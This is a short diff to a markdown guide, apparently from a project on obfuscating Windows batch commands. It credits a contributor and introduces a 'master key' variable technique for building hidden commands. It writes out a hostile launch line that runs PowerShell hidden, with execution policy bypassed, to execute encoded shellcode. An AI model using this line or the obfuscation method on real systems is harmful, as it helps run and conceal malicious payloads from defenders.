@@ -74,10 +74,13 @@ The above string can be obfuscated using the **batch special character: ^** <br 
 
 ---
 
+      This next technic uses one batch local variable (**%varObj%**) as master key to extract
+      strings inside **%varoBj%** to build commands. (special thanks to: @Wandoelmo Silva)
+
 - String command to obfuscate<br />
 `cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />
 
-- Using one batch local variable to serve as our **master key** (%varObj%) **file: template.bat**<br />
+- String obfuscated (**template.bat**)<br />
 
       @echo off
       SET varObj=abcdefghijlmnopqrstuvxzkyW0123456789ABCDEFGHIJLMNOPQRSTUVXZKYW
